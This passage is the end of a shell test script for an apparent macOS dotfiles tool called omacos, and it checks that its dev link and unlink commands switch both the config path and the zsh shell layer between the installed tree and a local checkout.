# Linking to the installed tree is what unlinking means; a leftover path.conf
# would make status and doctor disagree about which mode this is.
check "linking to installed unlinks" \
  "omacos-dev-link $fake_installed >/dev/null 2>&1; ! test -e $OMACOS_CONFIG/path.conf"

# .zshrc names a tree before OMACOS_PATH exists, so it always reaches for the
# installed one. Without a handoff, `dev link` repoints bin/ but the shell layer
# keeps coming from the installed tree — edits to it silently do nothing.
mkdir -p "$checkout/default/zsh"
printf 'source "${OMACOS_PATH:-$HOME/.local/share/omacos}/default/env-bootstrap"\necho FROM_CHECKOUT\n' \
  > "$checkout/default/zsh/omacos.zsh"
omacos-dev-link "$checkout" >/dev/null 2>&1
check "zsh layer follows the link" \
  "env HOME=$HOME XDG_CONFIG_HOME=$XDG_CONFIG_HOME zsh -c 'source $OMACOS_PATH/default/zsh/omacos.zsh' 2>/dev/null | grep -q FROM_CHECKOUT"
omacos-dev-unlink >/dev/null 2>&1
check "zsh layer stops following"  \
  "! env HOME=$HOME XDG_CONFIG_HOME=$XDG_CONFIG_HOME zsh -c 'source $OMACOS_PATH/default/zsh/omacos.zsh' 2>/dev/null | grep -q FROM_CHECKOUT"

printf '\n\033[1m%d passed, %d failed\033[0m\n\n' "$pass" "$fail"
((fail == 0))
